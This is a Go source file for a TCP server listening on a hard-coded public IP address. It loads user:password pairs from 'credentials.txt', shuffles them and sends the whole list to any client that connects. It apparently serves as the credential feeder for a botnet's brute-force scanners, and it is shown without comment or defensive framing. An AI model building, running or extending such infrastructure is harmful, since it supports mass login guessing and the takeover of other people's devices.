package main

import
(
    "net"
    "math/rand"
    "os"
    "bufio"
    "time"
    "strings"
    "fmt"
    "encoding/binary"
)

func main() {
    li, err := net.Listen("tcp", "203.159.80.75:7685")
    if err != nil {
        return
    }
    for {
        conn, err := li.Accept()
        if err != nil {
            return
        }
        go initial_handler(conn)
    }
}

func initial_handler(conn net.Conn) {
    defer conn.Close()
    
    readb := make([]byte, 2)
    li, err := conn.Read(readb)
    if err != nil || li <= 1 {
        return
    }

    c := binary.BigEndian.Uint16(readb[:2])

    fmt.Printf("Client requested %d credentials - %s\n", c, conn.RemoteAddr())

    fd, err := os.Open("credentials.txt")
    if err != nil {
        return
    }
    
    defer fd.Close()
    
    var m map[int]string
    var idx int
    var s []string

    m = make(map[int]string)
    
    r := bufio.NewReader(fd)
    scan := bufio.NewScanner(r)
    
    for scan.Scan() {
        m[idx] = scan.Text()
        idx++
    }

    fmt.Printf("Loaded %d credentials!\n", idx)

    if int(c) > idx {
//        fmt.Printf("Client requested too many credentials, not fulfilling request!\n")
        return
    }

    s = make([]string, idx)

    for i := 0; i < idx; i++ {
        s[i] = m[i]
    }
    
    // Shuffle the credentials
    for v := range s {
        a := rand.Intn(v + 1)
        s[v], s[a] = s[a], s[v]
    }

    buf := make([]byte, 0)
    var tmp []byte

    for q := 0; q < idx; q++ {
        sp := strings.Split(s[q], ":")
        for t := 0; t < 2; t++ {
            tmp = make([]byte, 1)
            str := []byte(sp[t])
            tmp[0] = uint8(len(sp[t]))
            tmp = append(tmp, str...)
            buf = append(buf, tmp...)
        }
    }

    conn.SetWriteDeadline(time.Now().Add(30 * time.Second))

    li, err = conn.Write(buf)
    if err != nil || li <= 1 {
        return
    }
    return
}
